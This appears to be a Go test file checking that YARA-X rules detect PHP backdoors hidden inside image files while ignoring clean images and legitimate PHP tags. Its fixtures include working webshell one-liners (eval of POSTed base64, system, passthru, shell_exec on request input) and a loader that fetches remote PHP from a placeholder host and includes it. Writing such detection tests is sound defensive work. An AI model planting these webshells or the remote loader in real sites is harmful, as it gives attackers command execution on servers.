//go:build yara

package signatures

import (
	"bytes"
	"image"
	"image/color"
	"image/gif"
	"image/jpeg"
	"image/png"
	"os"
	"path/filepath"
	"testing"

	yara_x "github.com/VirusTotal/yara-x/go"
)

func repositoryYARAScanner(t *testing.T) *yara_x.Scanner {
	t.Helper()
	source, err := os.ReadFile(filepath.Join("..", "..", "configs", "malware.yar"))
	if err != nil {
		t.Fatal(err)
	}
	rules, err := yara_x.Compile(string(source))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(rules.Destroy)
	scanner := yara_x.NewScanner(rules)
	t.Cleanup(scanner.Destroy)
	return scanner
}

func yaraRuleFired(t *testing.T, scanner *yara_x.Scanner, rule string, sample []byte) bool {
	t.Helper()
	results, err := scanner.Scan(sample)
	if err != nil {
		t.Fatal(err)
	}
	for _, matched := range results.MatchingRules() {
		if matched.Identifier() == rule {
			return true
		}
	}
	return false
}

func yaraOnePixel() image.Image {
	img := image.NewRGBA(image.Rect(0, 0, 1, 1))
	img.Set(0, 0, color.RGBA{R: 7, G: 8, B: 9, A: 255})
	return img
}

func yaraPNG(t *testing.T) []byte {
	t.Helper()
	var buf bytes.Buffer
	if err := png.Encode(&buf, yaraOnePixel()); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func yaraJPEG(t *testing.T) []byte {
	t.Helper()
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, yaraOnePixel(), nil); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func yaraGIF(t *testing.T) []byte {
	t.Helper()
	var buf bytes.Buffer
	if err := gif.Encode(&buf, yaraOnePixel(), nil); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// The 2026-09-17 payload: a real PNG that opens as a picture and whose
// trailing bytes fetch remote PHP and run it. Scheduled and on-demand scans
// hand every file to YARA-X regardless of extension, so this is the layer
// that had to fire and did not.
func TestBackdoorPHPInImageMatchesPolyglotContainers(t *testing.T) {
	scanner := repositoryYARAScanner(t)
	payload := []byte(`
<?php $ftp_url = "https://staging.example.test/rs/de.php";
$cu = curl_init();
curl_setopt_array($cu, array(CURLOPT_URL => $ftp_url, CURLOPT_RETURNTRANSFER => 1));
$datas = curl_exec($cu);
include($datas);
`)
	cases := map[string][]byte{
		"png_trailing_remote_fetch": append(yaraPNG(t), payload...),
		"png_text_chunk_eval":       append(yaraPNG(t), []byte("tEXtComment\x00<?php eval(base64_decode($_POST['c'])); ?>")...),
		"jpeg_appended_shell":       append(yaraJPEG(t), []byte("<?php system($_GET['cmd']); ?>")...),
		"gif_appended_shell":        append(yaraGIF(t), []byte("<?php passthru($_REQUEST['c']); ?>")...),
		"ico_appended_shell":        append(append([]byte{0x00, 0x00, 0x01, 0x00, 0x01, 0x00}, make([]byte, 20)...), []byte("<?php shell_exec($_GET['c']);")...),
		"webp_appended_shell":       append(append([]byte("RIFF\x24\x00\x00\x00WEBPVP8 "), make([]byte, 16)...), []byte("<?php eval($_POST['c']);")...),
	}
	for name, sample := range cases {
		t.Run(name, func(t *testing.T) {
			if !yaraRuleFired(t, scanner, "backdoor_php_in_image", sample) {
				t.Errorf("backdoor_php_in_image did not match %s", name)
			}
		})
	}
}

func TestBackdoorPHPInImageIgnoresOrdinaryAssets(t *testing.T) {
	scanner := repositoryYARAScanner(t)
	cases := map[string][]byte{
		"clean_png":  yaraPNG(t),
		"clean_jpeg": yaraJPEG(t),
		"clean_gif":  yaraGIF(t),
		// A plugin screenshot whose description chunk quotes a PHP opening
		// tag from the plugin's own usage instructions.
		"png_php_tag_in_description": append(yaraPNG(t),
			[]byte("tEXtDescription\x00Usage: add <?php the_widget('demo'); ?> to your theme.")...),
		// PHP source is PHP source. The webshell rules own it; this one must
		// not claim files that were never images.
		"php_source": []byte("<?php system($_GET['cmd']);"),
	}
	for name, sample := range cases {
		t.Run(name, func(t *testing.T) {
			if yaraRuleFired(t, scanner, "backdoor_php_in_image", sample) {
				t.Errorf("backdoor_php_in_image fired on %s", name)
			}
		})
	}
}

// Both engines see the same loader shapes, so neither can drift.
func TestBackdoorIncludeNonExecutableYARAMatchesGatedLoaders(t *testing.T) {
	scanner := repositoryYARAScanner(t)
	for name, sample := range includeLoaderPositives() {
		t.Run(name, func(t *testing.T) {
			if !yaraRuleFired(t, scanner, "backdoor_include_nonexecutable", []byte(sample)) {
				t.Errorf("backdoor_include_nonexecutable did not match %s", name)
			}
		})
	}
}

func TestBackdoorIncludeNonExecutableYARAIgnoresOrdinaryTemplating(t *testing.T) {
	scanner := repositoryYARAScanner(t)
	for name, sample := range includeLoaderNegatives() {
		t.Run(name, func(t *testing.T) {
			if yaraRuleFired(t, scanner, "backdoor_include_nonexecutable", []byte(sample)) {
				t.Errorf("backdoor_include_nonexecutable fired on %s", name)
			}
		})
	}
}
